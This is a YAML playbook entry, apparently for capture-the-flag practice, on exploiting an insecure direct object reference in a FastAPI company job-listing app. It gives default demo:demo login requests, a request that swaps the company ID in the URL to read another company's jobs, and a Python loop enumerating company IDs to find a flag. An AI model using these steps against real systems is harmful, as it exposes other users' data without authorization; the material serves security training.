name: fastapi_idor_company_jobs
category: web
tags: [idor, authorization, fastapi, python]
indicators:
  - "URL path contains user/object ID"
  - "No authorization check for resource access"
  - "Different users/companies with different permissions"
  - "Admin user has sensitive data (flag)"
  - "Default credentials available (demo:demo)"

tricks:
  - name: "Step 1: Identify IDOR vulnerability"
    when: "Found URL pattern like /company/{id}/jobs"
    how: "Check if authorization is validated"
    payload: |
      # Login as regular user (demo:demo)
      # Note the redirect URL: /company/1/jobs
      # Try accessing /company/2/jobs directly

  - name: "Step 2: Login with default credentials"
    when: "Found login form"
    how: "Use demo:demo to authenticate"
    payload: |
      POST /token
      Content-Type: application/x-www-form-urlencoded
      
      username=demo&password=demo

  - name: "Step 3: Exploit IDOR"
    when: "Logged in as regular user"
    how: "Change company_id in URL to access other companies' data"
    payload: |
      # After login, instead of /company/1/jobs
      # Access /company/2/jobs to get admin company's jobs
      # Flag is in the job with title "secret"
      
      GET /company/2/jobs
      Cookie: access_token=Bearer <token>

  - name: "Alternative: Enumerate all companies"
    when: "Don't know admin company ID"
    how: "Iterate through company IDs"
    payload: |
      for company_id in range(1, 10):
          resp = session.get(f"{target}/company/{company_id}/jobs")
          if "secret" in resp.text or "flag" in resp.text:
              print(f"Found in company {company_id}")


